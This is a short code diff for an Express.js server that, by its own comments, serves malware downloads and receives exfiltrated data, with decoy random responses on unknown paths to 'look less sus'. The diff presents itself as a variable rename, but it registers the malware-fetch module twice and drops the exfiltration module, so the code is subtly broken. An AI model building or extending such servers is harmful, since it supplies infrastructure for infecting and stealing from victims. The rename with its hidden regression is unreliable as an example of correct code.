@@ -2,8 +2,8 @@ const express = require("express");
 const server = express();
 
 const util = require("./util.js");
-const malware_reqs = require("./get_req.js");
-const malware_data = require("./post_req.js");
+const malwareReqs = require("./get_req.js");
+const malwareData = require("./post_req.js");
 
 // Log incoming traffic info
 server.all("*", (request, response, next) => {
@@ -20,8 +20,8 @@ server.all("*", (request, response, next) => {
 });
 
 // Handle fetching malware and data exfiltration
-server.use(malware_reqs);
-server.use(malware_data);
+server.use(malwareReqs);
+server.use(malwareReqs);
 
 // Handle all invalid paths. Generate some random numbers to make it look less sus
 server.all("*", (request, response) => {
